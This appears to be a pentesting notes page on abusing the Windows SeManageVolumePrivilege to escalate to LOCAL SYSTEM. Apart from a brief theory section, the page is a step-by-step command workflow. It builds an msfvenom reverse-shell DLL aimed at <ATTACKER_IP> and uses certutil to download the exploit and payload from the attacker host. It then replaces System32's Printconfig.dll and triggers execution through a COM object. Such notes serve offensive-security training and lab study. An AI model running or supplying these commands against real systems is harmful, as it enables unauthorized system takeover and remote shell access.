---
Primary_category: "[[WINDOWS PRIVESC]]"
title: "SEMANAGEVOLUMEPRIVILEGE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]

#### *Theory*

The `SeManageVolumePrivilege` privilege in Windows allows a user to perform volume-related operations, such as defragmenting, mounting, or dismounting a volume.

This privilege is normally restricted to highly privileged accounts, like Administrators.

An attacker may leverage this privileged to perform actions such as:

- ***Mount/Dismount Volumes***

Any volume can be mounted in order to access sensitive data or bypass access control mechanisms

- ***Corrupt or Manipulate File Systems***

Attackers could introduce malicious changes or corrupt files to create backdoors

- ***Code Execution***

---

#### *Enumeration*

##### *Current User Privileges*

```bash
whoami /priv
```

---

#### *Abuse - SeManageVolumeExploit*

##### *Requirements*

- ***The controlled account must have the SeManageVolumePrivilege enabled***

- ***The controlled account must be able to connect remotely to the target***

> ***e.g. WinRM, RDP and so on***

##### *Workflow*

###### *Downloading the malicious Binary*

> ***[SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET 'https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe' --remote-name
```

###### *Creating a malicious Payload*

> ***From the attacker*** ⚔️

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o Printconfig.dll
```

###### *Tranferring it to the target*

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

> ***PS***

```bash
mkdir $env:systemroot\temp\LPE
cd $env:systemroot\temp\LPE
```

```bash
certutil.exe -urlcache -split -f http://<ATTACKER_IP>/SeManageVolumeExploit.exe
```

```bash
certutil.exe -urlcache -split -f http://<ATTACKER_IP>/Printconfig.dll
```

###### *Granting Full Permissions to all Users to C:*

> ***From the target*** 🎯

```bash
.\SeManageVolumeExploit.exe
```


###### *Replacing Printconfig.dll with our payload*

> ***PS***

```bash
Copy-Item $env:systemroot\temp\LPE\Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
```

###### *Gaining Code Execution as LOCAL SYSTEM*

> ***PS***

```bash
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```

---

#### *Resources*

***[OSCP: SeManageVolumePrivilege](https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/semanagevolumeprivilege)***

***[Medium: Privilege Escalation via SeManageVolumePrivilege](https://medium.com/@mrlionofficial/privilege-escalation-via-semanagevolumeprivilege-2ebc0077b961)***